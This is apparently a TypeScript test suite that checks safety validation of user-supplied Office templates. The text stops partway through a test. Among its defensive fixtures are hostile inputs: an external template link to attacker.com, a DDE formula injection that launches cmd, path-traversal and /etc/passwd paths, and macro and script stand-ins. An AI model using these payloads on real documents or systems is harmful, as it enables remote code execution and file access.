/**
 * F6-05: Template and Output Safety Test Suite
 *
 * Hardens all three deliverable generators (generate_docx, generate_xlsx, generate_pptx):
 *   1. Shared validation for user-supplied templates across DOCX, XLSX, and PPTX formats
 *   2. Rejection of macro-enabled templates (.docm, .xlsm, .pptm, .dotm, .xltm, .potm, .xlam, .ppam)
 *   3. Rejection of VBA macro parts, ActiveX controls, and embedded OLE objects
 *   4. Rejection of executable keywords, scripts, external relationships, and remote URLs
 *   5. Rejection of spreadsheet formula injection in user-supplied templates
 *   6. Rejection of path traversal, null bytes, absolute paths, and symlink/junction escapes
 *   7. Enforcement that template content remains untrusted data and cannot alter:
 *      - approval requirements or approval status
 *      - source hashes or physical file freshness
 *      - provenance citations
 *      - reviewer metadata or PE sign-off identity
 *      - project scope
 *      - audit behavior
 *      - artifact finalization rules
 *   8. Pre-finalization output package safety inspection across DOCX, XLSX, and PPTX
 *   9. Tool boundary authorization and scope confinement for templatePath
 *  10. Privacy-safe audit trail (TEMPLATE_VALIDATED, TEMPLATE_REJECTED, OUTPUT_VALIDATED, OUTPUT_REJECTED)
 *  11. Preserved canary file invariant (rust/test.txt)
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import * as crypto from 'crypto';

import {
  OfficeDocxInput,
  OfficeXlsxInput,
  OfficePptxInput,
  DocxGenerationError,
  XlsxGenerationError,
  PptxGenerationError,
  TemplateSafetyError,
  computeOfficeInputHash,
} from '../../src/domain/office-artifact';
import {
  validateTemplatePath,
  inspectOfficePackageBuffer,
  validateOfficeTemplatePackage,
  validateOfficeOutputPackage,
  FORBIDDEN_MACRO_EXTENSIONS,
  ALLOWED_TEMPLATE_EXTENSIONS,
} from '../../src/industrial/office/template-safety';
import {
  OfficeTemplateSafetyService,
} from '../../src/service/office-template-safety-service';
import {
  DocxGeneratorService,
} from '../../src/service/docx-generator-service';
import {
  XlsxGeneratorService,
} from '../../src/service/xlsx-generator-service';
import {
  PptxGeneratorService,
} from '../../src/service/pptx-generator-service';
import {
  OfficeInputService,
} from '../../src/service/office-input-service';
import {
  ArtifactService,
} from '../../src/service/artifact-service';
import {
  ApprovalService,
} from '../../src/service/approval-service';
import {
  AuditService,
} from '../../src/service/audit-service';
import {
  EventService,
} from '../../src/service/event-service';
import {
  DurableIdempotencyStore,
} from '../../src/core/idempotency-store';
import {
  buildZipArchive,
  parseZipArchive,
  ZipFileInput,
} from '../../src/industrial/office/ooxml-packager';
import {
  executeGenerateDocxTool,
  executeGenerateXlsxTool,
  executeGeneratePptxTool,
  executeTool,
} from '../../src/integrations/tools';
import { createServiceContainer } from '../../src/service';

describe('F6-05: Template and Output Safety', () => {
  const CANARY_HASH = '1392245502333919f23e58b8f544f12470db3829aabd5336a011e58d2b733435';
  let projectRoot: string;
  let eventService: EventService;
  let approvalService: ApprovalService;
  let artifactService: ArtifactService;
  let auditService: AuditService;
  let officeInputService: OfficeInputService;
  let idempotencyStore: DurableIdempotencyStore;
  let templateSafetyService: OfficeTemplateSafetyService;
  let docxGenerator: DocxGeneratorService;
  let xlsxGenerator: XlsxGeneratorService;
  let pptxGenerator: PptxGeneratorService;

  const sampleSourceContent = 'Safety Valve PSV-101 certified calibration tolerance is 1.5% with set pressure 150 psi.';
  const sampleSourceHash = crypto.createHash('sha256').update(sampleSourceContent, 'utf-8').digest('hex');

  // ── Package Builders for Test Fixtures ─────────────────────────────

  function createValidDocxTemplateBuffer(): Buffer {
    const files: ZipFileInput[] = [
      {
        path: '[Content_Types].xml',
        data: '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/></Types>',
      },
      {
        path: '_rels/.rels',
        data: '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>',
      },
      {
        path: 'word/document.xml',
        data: '<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Corporate Template Header</w:t></w:r></w:p></w:body></w:document>',
      },
    ];
    return buildZipArchive(files);
  }

  function createValidXlsxTemplateBuffer(): Buffer {
    const files: ZipFileInput[] = [
      {
        path: '[Content_Types].xml',
        data: '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/></Types>',
      },
      {
        path: '_rels/.rels',
        data: '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>',
      },
      {
        path: 'xl/workbook.xml',
        data: '<?xml version="1.0" encoding="UTF-8"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets><sheet name="Sheet1" sheetId="1" id="rId1"/></sheets></workbook>',
      },
      {
        path: 'xl/worksheets/sheet1.xml',
        data: '<?xml version="1.0" encoding="UTF-8"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>Template Sheet</t></is></c></row></sheetData></worksheet>',
      },
    ];
    return buildZipArchive(files);
  }

  function createValidPptxTemplateBuffer(): Buffer {
    const files: ZipFileInput[] = [
      {
        path: '[Content_Types].xml',
        data: '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/></Types>',
      },
      {
        path: '_rels/.rels',
        data: '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="ppt/presentation.xml"/></Relationships>',
      },
      {
        path: 'ppt/presentation.xml',
        data: '<?xml version="1.0" encoding="UTF-8"?><p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"><p:sldIdLst><p:sldId id="256" id2="rId1"/></p:sldIdLst></p:presentation>',
      },
      {
        path: 'ppt/slides/slide1.xml',
        data: '<?xml version="1.0" encoding="UTF-8"?><p:sld xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"><p:cSld><p:spTree><p:sp><p:txBody><a:p><a:r><a:t>Template Presentation</a:t></a:r></a:p></p:txBody></p:sp></p:spTree></p:cSld></p:sld>',
      },
    ];
    return buildZipArchive(files);
  }

  // ── Input Contract Creators ────────────────────────────────────────

  function createValidDocxInput(overrides: Partial<OfficeDocxInput> = {}): OfficeDocxInput {
    const base: OfficeDocxInput = {
      schemaVersion: 1,
      projectId: 'test-project',
      runId: 'run-001',
      taskId: 'task-inspect-01',
      artifactType: 'docx',
      title: 'Safety Valve Inspection Note',
      author: {
        id: 'agent-inspector-01',
        name: 'Lead Inspector Agent',
        role: 'Safety Verification Engineer',
      },
      sections: [
        {
          id: 'sec-1',
          heading: 'Executive Summary',
          content: 'Calibration inspection verified against ASME Section VIII.',
          order: 1,
          findingIds: ['find-1'],
          citationIds: ['cit-1'],
        },
      ],
      findings: [
        {
          id: 'find-1',
          category: 'Pressure Relief',
          statement: 'PSV-101 safety relief tolerance observed within bounds.',
          severity: 'info',
          status: 'PASS',
          metric: 'relief_tolerance',
          observedValue: 1.5,
          thresholdValue: 2.0,
          unit: '%',
          citationIds: ['cit-1'],
          verified: true,
        },
      ],
      measurements: [
        {
          id: 'meas-1',
          name: 'set_pressure',
          numericValue: 150.0,
          unit: 'psi',
          status: 'nominal',
          citationIds: ['cit-1'],
        },
      ],
      units: ['%', 'psi'],
      calculations: [],
      warnings: [],
      limitations: [],
      proseBlocks: [],
      conclusions: [],
      citations: [
        {
          citationId: 'cit-1',
          sourcePath: 'docs/valves.txt',
          sourceHash: sampleSourceHash,
          documentId: 'doc-valves-01',
          chunkId: 'chunk-001',
          pageNumber: 1,
          sectionHeading: 'PSV Calibration Log',
          snippet: sampleSourceContent,
          verifiedAt: '2026-09-20T10:00:00Z',
        },
      ],
      sourceArtifactIds: [],
      sourceHashes: { 'docs/valves.txt': sampleSourceHash },
      references: [],
      evidenceState: {
        ocrConfidence: 0.98,
        vlmConfidence: 0.95,
        hasUnresolvedConflicts: false,
        isQuarantined: false,
        reviewedByHuman: true,
        reviewerId: 'human-chief-engineer',
      },
      generatedAt: '2026-09-20T10:00:00Z',
      approval: {
        required: true,
        approvalId: 'appr-docx-001',
        approvedBy: 'lead-engineer@industrial.corp',
        status: 'approved',
        approvedAt: '2026-09-20T10:00:00Z',
      },
    };

    const combined: OfficeDocxInput = { ...base, ...overrides };
    if (overrides.approval) {
      (combined as any).approval = { ...base.approval, ...overrides.approval };
    }
    const hash = computeOfficeInputHash(combined);
    if (!overrides.approval?.payloadHash) {
      (combined as any).approval = {
        ...combined.approval,
        payloadHash: hash,
      };
    }
    return combined;
  }

  function createValidXlsxInput(overrides: Partial<OfficeXlsxInput> = {}): OfficeXlsxInput {
    const base: OfficeXlsxInput = {
      schemaVersion: 1,
      projectId: 'test-project',
      runId: 'run-xlsx-001',
      taskId: 'task-inspect-xlsx-01',
      artifactType: 'xlsx',
      title: 'Safety Valve Verification Workbook',
      author: {
        id: 'agent-inspector-01',
        name: 'Lead Inspector Agent',
        role: 'Safety Verification Engineer',
      },
      sections: [
        {
          id: 'sec-1',
          heading: 'Executive Inspection Summary',
          content: 'Verification of PSV-101 overpressure mitigation system.',
          order: 1,
          findingIds: ['find-1'],
          citationIds: ['cit-1'],
        },
      ],
      findings: [
        {
          id: 'find-1',
          category: 'Pressure Relief',
          statement: 'PSV-101 safety relief tolerance observed within approved bounds.',
          severity: 'info',
          status: 'PASS',
          metric: 'relief_tolerance',
          observedValue: 1.5,
          thresholdValue: 2.0,
          unit: '%',
          citationIds: ['cit-1'],
          verified: true,
        },
      ],
      measurements: [
        {
          id: 'meas-1',
          name: 'set_pressure',
          numericValue: 150.0,
          unit: 'psi',
          status: 'nominal',
          citationIds: ['cit-1'],
        },
      ],
      units: ['%', 'psi'],
      calculations: [],
      warnings: [],
      limitations: [],
      proseBlocks: [],
      conclusions: [],
      citations: [
        {
          citationId: 'cit-1',
          sourcePath: 'docs/valves.txt',
          sourceHash: sampleSourceHash,
          documentId: 'doc-valves-01',
          chunkId: 'chunk-001',
          pageNumber: 1,
          sectionHeading: 'PSV Calibration Log',
          snippet: sampleSourceContent,
          verifiedAt: '2026-09-20T10:00:00Z',
        },
      ],
      sourceArtifactIds: [],
      sourceHashes: { 'docs/valves.txt': sampleSourceHash },
      references: [],
      evidenceState: {
        ocrConfidence: 0.98,
        vlmConfidence: 0.95,
        hasUnresolvedConflicts: false,
        isQuarantined: false,
        reviewedByHuman: true,
        reviewerId: 'human-chief-engineer',
      },
      generatedAt: '2026-09-20T10:00:00Z',
      approval: {
        required: true,
        approvalId: 'appr-xlsx-001',
        approvedBy: 'lead-engineer@industrial.corp',
        status: 'approved',
        approvedAt: '2026-09-20T10:00:00Z',
      },
    };

    const combined: OfficeXlsxInput = { ...base, ...overrides };
    if (overrides.approval) {
      (combined as any).approval = { ...base.approval, ...overrides.approval };
    }
    const hash = computeOfficeInputHash(combined);
    if (!overrides.approval?.payloadHash) {
      (combined as any).approval = {
        ...combined.approval,
        payloadHash: hash,
      };
    }
    return combined;
  }

  function createValidPptxInput(overrides: Partial<OfficePptxInput> = {}): OfficePptxInput {
    const base: OfficePptxInput = {
      schemaVersion: 1,
      projectId: 'test-project',
      runId: 'run-pptx-001',
      taskId: 'task-inspect-pptx-01',
      artifactType: 'pptx',
      title: 'Pressure Safety Valve Verification Presentation',
      author: {
        id: 'agent-inspector-01',
        name: 'Lead Inspector Agent',
        role: 'Safety Verification Engineer',
      },
      sections: [
        {
          id: 'sec-1',
          heading: 'Executive Inspection Summary',
          content: 'Verification of PSV-101 overpressure mitigation system according to ASME Section VIII.',
          order: 1,
          findingIds: ['find-1'],
          citationIds: ['cit-1'],
        },
      ],
      findings: [
        {
          id: 'find-1',
          category: 'Pressure Relief',
          statement: 'PSV-101 safety relief tolerance observed within approved bounds.',
          severity: 'info',
          status: 'PASS',
          metric: 'relief_tolerance',
          observedValue: 1.5,
          thresholdValue: 2.0,
          unit: '%',
          citationIds: ['cit-1'],
          verified: true,
        },
      ],
      measurements: [
        {
          id: 'meas-1',
          name: 'set_pressure',
          numericValue: 150.0,
          unit: 'psi',
          status: 'nominal',
          citationIds: ['cit-1'],
        },
      ],
      units: ['%', 'psi'],
      calculations: [],
      warnings: [],
      limitations: [],
      proseBlocks: [],
      conclusions: [],
      citations: [
        {
          citationId: 'cit-1',
          sourcePath: 'docs/valves.txt',
          sourceHash: sampleSourceHash,
          documentId: 'doc-valves-01',
          chunkId: 'chunk-001',
          pageNumber: 1,
          sectionHeading: 'PSV Calibration Log',
          snippet: sampleSourceContent,
          verifiedAt: '2026-09-20T10:00:00Z',
        },
      ],
      sourceArtifactIds: [],
      sourceHashes: { 'docs/valves.txt': sampleSourceHash },
      references: [],
      evidenceState: {
        ocrConfidence: 0.98,
        vlmConfidence: 0.95,
        hasUnresolvedConflicts: false,
        isQuarantined: false,
        reviewedByHuman: true,
        reviewerId: 'human-chief-engineer',
      },
      generatedAt: '2026-09-20T10:00:00Z',
      approval: {
        required: true,
        approvalId: 'appr-pptx-001',
        approvedBy: 'lead-engineer@industrial.corp',
        status: 'approved',
        approvedAt: '2026-09-20T10:00:00Z',
      },
    };

    const combined: OfficePptxInput = { ...base, ...overrides };
    if (overrides.approval) {
      (combined as any).approval = { ...base.approval, ...overrides.approval };
    }
    const hash = computeOfficeInputHash(combined);
    if (!overrides.approval?.payloadHash) {
      (combined as any).approval = {
        ...combined.approval,
        payloadHash: hash,
      };
    }
    return combined;
  }

  // ── Setup and Teardown ──────────────────────────────────────────────

  beforeEach(() => {
    projectRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'maos-f6-05-test-'));

    // Create directories
    fs.mkdirSync(path.join(projectRoot, 'docs'), { recursive: true });
    fs.mkdirSync(path.join(projectRoot, 'artifacts'), { recursive: true });
    fs.mkdirSync(path.join(projectRoot, 'templates'), { recursive: true });
    fs.mkdirSync(path.join(projectRoot, '.maos', 'audit'), { recursive: true });
    fs.mkdirSync(path.join(projectRoot, '.maos', 'idempotency'), { recursive: true });
    fs.mkdirSync(path.join(projectRoot, '.maos', 'approvals'), { recursive: true });

    // Seed physical source file
    fs.writeFileSync(path.join(projectRoot, 'docs', 'valves.txt'), sampleSourceContent, 'utf-8');

    // Seed approved records matching test fixtures
    for (const [id, task] of [
      ['appr-docx-001', 'task-inspect-01'],
      ['appr-xlsx-001', 'task-inspect-xlsx-01'],
      ['appr-pptx-001', 'task-inspect-pptx-01'],
    ]) {
      fs.writeFileSync(
        path.join(projectRoot, '.maos', 'approvals', `${id}.json`),
        JSON.stringify({
          schemaVersion: 1,
          id,
          taskId: task,
          status: 'approved',
          requestedBy: 'agent-inspector-01',
          approverRole: 'chief_engineer',
          description: `Approval note for ${id}`,
          createdAt: '2026-09-20T10:00:00Z',
          decidedAt: '2026-09-20T10:05:00Z',
          decidedBy: 'human-chief-engineer',
          reason: 'All criteria pass formal safety inspection requirements.',
        }),
        'utf-8',
      );
    }

    eventService = new EventService(projectRoot);
    approvalService = new ApprovalService(projectRoot);
    artifactService = new ArtifactService(projectRoot, eventService, approvalService);
    auditService = new AuditService(projectRoot);
    officeInputService = new OfficeInputService(projectRoot, artifactService, approvalService, auditService);
    idempotencyStore = new DurableIdempotencyStore(projectRoot);
    templateSafetyService = new OfficeTemplateSafetyService(projectRoot, auditService);

    docxGenerator = new DocxGeneratorService(
      projectRoot,
      artifactService,
      approvalService,
      auditService,
      officeInputService,
      idempotencyStore,
      templateSafetyService,
    );

    xlsxGenerator = new XlsxGeneratorService(
      projectRoot,
      artifactService,
      approvalService,
      auditService,
      officeInputService,
      idempotencyStore,
      templateSafetyService,
    );

    pptxGenerator = new PptxGeneratorService(
      projectRoot,
      artifactService,
      approvalService,
      auditService,
      officeInputService,
      idempotencyStore,
      templateSafetyService,
    );
  });

  afterEach(() => {
    if (fs.existsSync(projectRoot)) {
      try {
        fs.rmSync(projectRoot, { recursive: true, force: true });
      } catch {
        // ignore cleanup error
      }
    }
  });

  // ── Section 1: Template Path Validation (Pure Engine) ───────────────

  describe('1. Template Path Validation (Pure Engine)', () => {
    it('accepts valid template paths for DOCX (.docx, .dotx)', () => {
      fs.writeFileSync(path.join(projectRoot, 'templates', 'standard.docx'), createValidDocxTemplateBuffer());
      fs.writeFileSync(path.join(projectRoot, 'templates', 'standard.dotx'), createValidDocxTemplateBuffer());

      const res1 = validateTemplatePath('templates/standard.docx', projectRoot, 'docx');
      expect(res1.valid).toBe(true);
      expect(res1.resolvedAbsPath).toBe(path.resolve(projectRoot, 'templates', 'standard.docx'));

      const res2 = validateTemplatePath('templates/standard.dotx', projectRoot, 'docx');
      expect(res2.valid).toBe(true);
    });

    it('accepts valid template paths for XLSX (.xlsx, .xltx)', () => {
      fs.writeFileSync(path.join(projectRoot, 'templates', 'sheet.xlsx'), createValidXlsxTemplateBuffer());
      fs.writeFileSync(path.join(projectRoot, 'templates', 'sheet.xltx'), createValidXlsxTemplateBuffer());

      const res1 = validateTemplatePath('templates/sheet.xlsx', projectRoot, 'xlsx');
      expect(res1.valid).toBe(true);

      const res2 = validateTemplatePath('templates/sheet.xltx', projectRoot, 'xlsx');
      expect(res2.valid).toBe(true);
    });

    it('accepts valid template paths for PPTX (.pptx, .potx)', () => {
      fs.writeFileSync(path.join(projectRoot, 'templates', 'deck.pptx'), createValidPptxTemplateBuffer());
      fs.writeFileSync(path.join(projectRoot, 'templates', 'deck.potx'), createValidPptxTemplateBuffer());

      const res1 = validateTemplatePath('templates/deck.pptx', projectRoot, 'pptx');
      expect(res1.valid).toBe(true);

      const res2 = validateTemplatePath('templates/deck.potx', projectRoot, 'pptx');
      expect(res2.valid).toBe(true);
    });

    it('strictly rejects macro-enabled extensions (.docm, .xlsm, .pptm, .dotm, .xltm, .potm, .xlam, .ppam)', () => {
      for (const macroExt of FORBIDDEN_MACRO_EXTENSIONS) {
        const filePath = `templates/dangerous${macroExt}`;
        const res = validateTemplatePath(filePath, projectRoot, 'docx');
        expect(res.valid).toBe(false);
        expect(res.errors.some((e) => e.includes('TEMPLATE_FORBIDDEN_EXTENSION'))).toBe(true);
      }
    });

    it('strictly rejects path traversal patterns (..) in template paths', () => {
      const res1 = validateTemplatePath('../escape.docx', projectRoot, 'docx');
      expect(res1.valid).toBe(false);
      expect(res1.errors.some((e) => e.includes('TEMPLATE_PATH_TRAVERSAL'))).toBe(true);

      const res2 = validateTemplatePath('templates/../../escape.docx', projectRoot, 'docx');
      expect(res2.valid).toBe(false);
    });

    it('strictly rejects absolute paths and drive letter paths', () => {
      const resAbs = validateTemplatePath('/etc/corporate.docx', projectRoot, 'docx');
      expect(resAbs.valid).toBe(false);

      const resDrive = validateTemplatePath('C:\\windows\\win.docx', projectRoot, 'docx');
      expect(resDrive.valid).toBe(false);
    });

    it('strictly rejects null bytes in template path', () => {
      const res = validateTemplatePath('templates/safe.docx\0.exe', projectRoot, 'docx');
      expect(res.valid).toBe(false);
      expect(res.errors.some((e) => e.includes('TEMPLATE_PATH_TRAVERSAL'))).toBe(true);
    });

    it('strictly rejects remote URLs and protocol schemes', () => {
      const resHttp = validateTemplatePath('http://malicious.corp/template.docx', projectRoot, 'docx');
      expect(resHttp.valid).toBe(false);

      const resFile = validateTemplatePath('file:///etc/passwd.docx', projectRoot, 'docx');
      expect(resFile.valid).toBe(false);
    });

    it('rejects non-existent template files on disk', () => {
      const res = validateTemplatePath('templates/does_not_exist.docx', projectRoot, 'docx');
      expect(res.valid).toBe(false);
      expect(res.errors.some((e) => e.includes('TEMPLATE_FILE_NOT_FOUND'))).toBe(true);
    });

    it('rejects directory targets that are not regular files', () => {
      const res = validateTemplatePath('templates', projectRoot, 'docx');
      expect(res.valid).toBe(false);
    });

    it('rejects symlinks that resolve outside the project root', () => {
      const externalDir = fs.mkdtempSync(path.join(os.tmpdir(), 'maos-external-'));
      const externalFile = path.join(externalDir, 'external.docx');
      fs.writeFileSync(externalFile, createValidDocxTemplateBuffer());

      const symlinkPath = path.join(projectRoot, 'templates', 'escapelink.docx');
      try {
        fs.symlinkSync(externalFile, symlinkPath);
        const res = validateTemplatePath('templates/escapelink.docx', projectRoot, 'docx');
        expect(res.valid).toBe(false);
        expect(res.errors.some((e) => e.includes('TEMPLATE_PATH_OUTSIDE_PROJECT'))).toBe(true);
      } catch (err: any) {
        // Windows unprivileged symlink creation may skip if restricted
        if (err.code !== 'EPERM') throw err;
      } finally {
        fs.rmSync(externalDir, { recursive: true, force: true });
      }
    });
  });

  // ── Section 2: Package Security Deep Inspection ─────────────────────

  describe('2. Package Security Deep Inspection', () => {
    it('validates compliant DOCX, XLSX, and PPTX packages', () => {
      const docxRes = inspectOfficePackageBuffer(createValidDocxTemplateBuffer(), 'docx', true);
      expect(docxRes.valid).toBe(true);
      expect(docxRes.errors).toEqual([]);

      const xlsxRes = inspectOfficePackageBuffer(createValidXlsxTemplateBuffer(), 'xlsx', true);
      expect(xlsxRes.valid).toBe(true);

      const pptxRes = inspectOfficePackageBuffer(createValidPptxTemplateBuffer(), 'pptx', true);
      expect(pptxRes.valid).toBe(true);
    });

    it('rejects corrupted or non-ZIP package buffers', () => {
      const badBuffer = Buffer.from('NOT A ZIP FILE HEADER HERE');
      const res = inspectOfficePackageBuffer(badBuffer, 'docx', true);
      expect(res.valid).toBe(false);
      expect(res.errors.some((e) => e.includes('TEMPLATE_INVALID_ZIP'))).toBe(true);
    });

    it('rejects package containing VBA macro parts (vbaProject.bin, vbaData.xml)', () => {
      const maliciousFiles: ZipFileInput[] = [
        { path: '[Content_Types].xml', data: '<?xml version="1.0"?><Types/>' },
        { path: 'word/document.xml', data: '<?xml version="1.0"?><w:document><w:body/></w:document>' },
        { path: 'word/vbaProject.bin', data: Buffer.from('VBA_BINARY_PAYLOAD_HERE') },
      ];
      const buf = buildZipArchive(maliciousFiles);
      const res = inspectOfficePackageBuffer(buf, 'docx', true);
      expect(res.valid).toBe(false);
      expect(res.errors.some((e) => e.includes('TEMPLATE_MACRO_DETECTED'))).toBe(true);
    });

    it('rejects package containing ActiveX components', () => {
      const maliciousFiles: ZipFileInput[] = [
        { path: '[Content_Types].xml', data: '<?xml version="1.0"?><Types/>' },
        { path: 'word/document.xml', data: '<?xml version="1.0"?><w:document><w:body/></w:document>' },
        { path: 'word/activeX/activeX1.xml', data: '<?xml version="1.0"?><activeX/>' },
      ];
      const buf = buildZipArchive(maliciousFiles);
      const res = inspectOfficePackageBuffer(buf, 'docx', true);
      expect(res.valid).toBe(false);
      expect(res.errors.some((e) => e.includes('TEMPLATE_MACRO_DETECTED') || e.includes('TEMPLATE_ACTIVE_CONTENT_DETECTED'))).toBe(true);
    });

    it('rejects package containing embedded OLE active objects (<w:object>, <p:oleObj>, <oleObjects>)', () => {
      const docxWithOle: ZipFileInput[] = [
        { path: '[Content_Types].xml', data: '<?xml version="1.0"?><Types/>' },
        {
          path: 'word/document.xml',
          data: '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:object><w:shape/></w:object></w:body></w:document>',
        },
      ];
      const buf = buildZipArchive(docxWithOle);
      const res = inspectOfficePackageBuffer(buf, 'docx', true);
      expect(res.valid).toBe(false);
      expect(res.errors.some((e) => e.includes('TEMPLATE_ACTIVE_CONTENT_DETECTED'))).toBe(true);
    });

    it('rejects package containing embedded executable scripts (powershell, cmd.exe, wscript)', () => {
      const docxWithScript: ZipFileInput[] = [
        { path: '[Content_Types].xml', data: '<?xml version="1.0"?><Types/>' },
        {
          path: 'word/document.xml',
          data: '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Run powershell.exe payload</w:t></w:r></w:p></w:body></w:document>',
        },
      ];
      const buf = buildZipArchive(docxWithScript);
      const res = inspectOfficePackageBuffer(buf, 'docx', true);
      expect(res.valid).toBe(false);
      expect(res.errors.some((e) => e.includes('TEMPLATE_ACTIVE_CONTENT_DETECTED'))).toBe(true);
    });

    it('rejects package containing external relationships (TargetMode="External")', () => {
      const docxWithExternal: ZipFileInput[] = [
        { path: '[Content_Types].xml', data: '<?xml version="1.0"?><Types/>' },
        {
          path: 'word/_rels/document.xml.rels',
          data: '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://attacker.com/template.dotm" TargetMode="External"/></Relationships>',
        },
        {
          path: 'word/document.xml',
          data: '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p/></w:body></w:document>',
        },
      ];
      const buf = buildZipArchive(docxWithExternal);
      const res = inspectOfficePackageBuffer(buf, 'docx', true);
      expect(res.valid).toBe(false);
      expect(res.errors.some((e) => e.includes('TEMPLATE_EXTERNAL_RELATIONSHIP'))).toBe(true);
    });

    it('rejects package containing forbidden remote URLs in text runs (<w:t>, <t>, <a:t>)', () => {
      const docxWithUrlText: ZipFileInput[] = [
        { path: '[Content_Types].xml', data: '<?xml version="1.0"?><Types/>' },
        {
          path: 'word/document.xml',
          data: '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Download weights from https://unauthorized.weights/vlm.bin</w:t></w:r></w:p></w:body></w:document>',
        },
      ];
      const buf = buildZipArchive(docxWithUrlText);
      const res = inspectOfficePackageBuffer(buf, 'docx', true);
      expect(res.valid).toBe(false);
      expect(res.errors.some((e) => e.includes('TEMPLATE_EXTERNAL_RELATIONSHIP'))).toBe(true);
    });

    it('rejects spreadsheet templates with formula injection in <f> tags', () => {
      const xlsxWithFormulaInjection: ZipFileInput[] = [
        { path: '[Content_Types].xml', data: '<?xml version="1.0"?><Types/>' },
        {
          path: 'xl/worksheets/sheet1.xml',
          data: '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row r="1"><c r="A1"><f>=cmd|\' /C calc\'!A0</f></c></row></sheetData></worksheet>',
        },
      ];
      const buf = buildZipArchive(xlsxWithFormulaInjection);
      const res = inspectOfficePackageBuffer(buf, 'xlsx', true);
      expect(res.valid).toBe(false);
      expect(res.errors.some((e) => e.includes('TEMPLATE_FORMULA_INJECTION'))).toBe(true);
    });

    it('rejects malformed XML in template package parts', () => {
      const docxMalformedXml: ZipFileInput[] = [
        { path: '[Content_Types].xml', data: '<?xml version="1.0"?><Types>' }, // missing close tag
        { path: 'word/document.xml', data: '<?xml version="1.0"?><w:document><w:body></w:body></w:document>' },
      ];
      const buf = buildZipArchive(docxMalformedXml);
      const res = inspectOfficePackageBuffer(buf, 'docx', true);
      expect(res.valid).toBe(false);
      expect(res.errors.some((e) => e.includes('TEMPLATE_XML_MALFORMED'))).toBe(true);
    });
  });

  // ── Section 3: OfficeTemplateSafetyService Unit Tests ────────────────

  describe('3. OfficeTemplateSafetyService', () => {
    it('validates a valid template file and emits TEMPLATE_VALIDATED audit event', () => {
      const templatePath = 'templates/valid.docx';
      fs.writeFileSync(path.join(projectRoot, templatePath), createValidDocxTemplateBuffer());

      const summary = templateSafetyService.validateTemplate(templatePath, 'docx', {
        runId: 'run-audit-test',
        actor: 'test_agent',
      });

      expect(summary.valid).toBe(true);
      expect(summary.templateHash).toBeDefined();

      const events = auditService.getRecords();
      const valEvent = events.find((e) => (e.data as any).event === 'TEMPLATE_VALIDATED');
      expect(valEvent).toBeDefined();
      expect((valEvent?.data as any).templateHash).toBe(summary.templateHash);
    });

    it('rejects an invalid template file and emits TEMPLATE_REJECTED audit event', () => {
      const templatePath = 'templates/invalid.docm';
      fs.writeFileSync(path.join(projectRoot, templatePath), createValidDocxTemplateBuffer());

      const summary = templateSafetyService.validateTemplate(templatePath, 'docx', {
        runId: 'run-reject-test',
        actor: 'test_agent',
      });

      expect(summary.valid).toBe(false);

      const events = auditService.getRecords();
      const rejEvent = events.find((e) => (e.data as any).event === 'TEMPLATE_REJECTED');
      expect(rejEvent).toBeDefined();
      expect((rejEvent?.data as any).reason).toBe('PATH_VALIDATION_FAILED');
    });

    it('assertTemplateSafety throws TemplateSafetyError on invalid template', () => {
      expect(() => {
        templateSafetyService.assertTemplateSafety('templates/missing.docx', 'docx');
      }).toThrowError(TemplateSafetyError);
    });

    it('assertUntrustedTemplateIntegrity rejects attempts to tamper with approval or citations', () => {
      const input = createValidDocxInput();
      const canonicalHash = computeOfficeInputHash(input);

      // 1. Missing approval
      expect(() => {
        templateSafetyService.assertUntrustedTemplateIntegrity({ ...input, approval: null as any }, canonicalHash);
      }).toThrowError(/Approval metadata is missing/);

      // 2. Tampered approval hash
      expect(() => {
        templateSafetyService.assertUntrustedTemplateIntegrity(
          { ...input, approval: { ...input.approval, payloadHash: 'tampered-hash-000' } },
          canonicalHash,
        );
